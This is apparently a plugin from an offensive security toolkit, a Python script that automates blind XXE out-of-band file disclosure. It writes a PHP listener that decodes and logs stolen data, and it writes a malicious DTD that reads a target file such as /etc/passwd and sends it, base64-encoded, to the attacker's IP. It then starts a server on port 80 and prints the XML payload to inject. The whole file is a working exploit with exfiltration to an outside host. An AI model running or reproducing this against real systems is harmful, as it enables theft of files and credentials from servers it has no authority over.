import subprocess
from pathlib import Path

from core.attacker import get_ip


NAME = "xxe.oob"
DESCRIPTION = "Generate blind XXE OOB file disclosure payloads."


G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
M = "\033[95m"
W = "\033[0m"
BOLD = "\033[1m"


PHP = """<?php

if(isset($_GET["content"])){

    error_log("\\n\\n" . base64_decode($_GET["content"]));

}

?>"""


def print_payload(title, payload):
    print(f"\n{G}[+] {title}{W}")
    print(payload)


def get_file():

    path = input(f"{Y}File [/etc/passwd]>{W} ").strip()

    return path or "/etc/passwd"


def create_php():

    php = Path("index.php")
    php.write_text(PHP)

    return php


def create_dtd(ip, path):

    dtd = Path("xxe.dtd")

    dtd.write_text(
f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={path}">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://{ip}:80/?content=%file;'>">"""
    )

    return dtd


def start_php_server():

    try:
        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                "php -S 0.0.0.0:80",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True

    except Exception:

        return False


def run(data, cred, args):

    ip = get_ip()
    path = get_file()

    php = create_php()
    dtd = create_dtd(ip, path)

    server = start_php_server()

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY % remote SYSTEM "http://{ip}:80/{dtd.name}">
%remote;
%oob;
]>
<root>&content;</root>"""

    print_payload("Blind XXE OOB Payload", payload)

    print(f"\n{G}[+] Files Created{W}")
    print(php.resolve())
    print(dtd.resolve())

    if server:
        print(f"\n{G}[+] PHP Server Started{W}")
        print(f"http://{ip}:80/")
    else:
        print(f"\n{R}[-] Failed to start PHP server.{W}")
        print("Run manually:")
        print("php -S 0.0.0.0:80")

    print(f"\n{Y}[*]{W} Incoming requests will automatically decode and print the exfiltrated file.")
